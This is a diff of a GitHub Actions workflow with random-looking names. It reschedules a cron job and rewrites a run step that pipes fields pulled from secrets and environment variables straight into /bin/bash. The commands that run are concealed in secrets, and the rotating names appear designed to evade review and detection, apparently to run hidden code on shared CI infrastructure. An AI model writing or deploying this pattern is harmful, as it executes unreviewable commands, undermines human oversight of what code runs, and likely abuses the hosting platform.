@@ -3,7 +3,8 @@ name: baiheizi7182
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '55 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: baiheizi7182
         env:
-          ufh9885: ${{ secrets.ufh9885 }}
+          nwb8651: ${{ secrets.nwb8651 }}
         run: |
-          echo $ufh9885 | jq -r .rdcu50379 | /bin/bash
-          echo $mihti8082 | jq -r .itm69 | /bin/bash
-          echo $k514 | jq -r .bb74 | /bin/bash
-          echo $t12918 | jq -r .a5833 | /bin/bash
-          echo $qfh0 | jq -r .qgfay4606 | /bin/bash
-          echo $qtc837 | jq -r .quzpo82 | /bin/bash
-          echo $a242 | jq -r .qhws5531 | /bin/bash
-          echo $uof786 | jq -r .shamp9 | /bin/bash
-          echo $c244 | jq -r .eqwj4176 | /bin/bash
+          echo $nwb8651 | jq -r .kqmub0723 | /bin/bash
+          echo $npmx38 | jq -r .fl7519 | /bin/bash
+          echo $kqk6 | jq -r .v7912 | /bin/bash
+          echo $los812 | jq -r .lsmx4554 | /bin/bash
+          echo $yayls71969 | jq -r .kgk25 | /bin/bash
+          echo $iak227 | jq -r .tgq75 | /bin/bash
+          echo $kcbef0141 | jq -r .sdwxe7 | /bin/bash
+          echo $ejiqz09385 | jq -r .ye96 | /bin/bash
+          echo $eveo4 | jq -r .pswki800 | /bin/bash
+          echo $hscp04055 | jq -r .h6 | /bin/bash
+          echo $q6 | jq -r .pq28 | /bin/bash
+          echo $mciiq4470 | jq -r .i07825 | /bin/bash
 
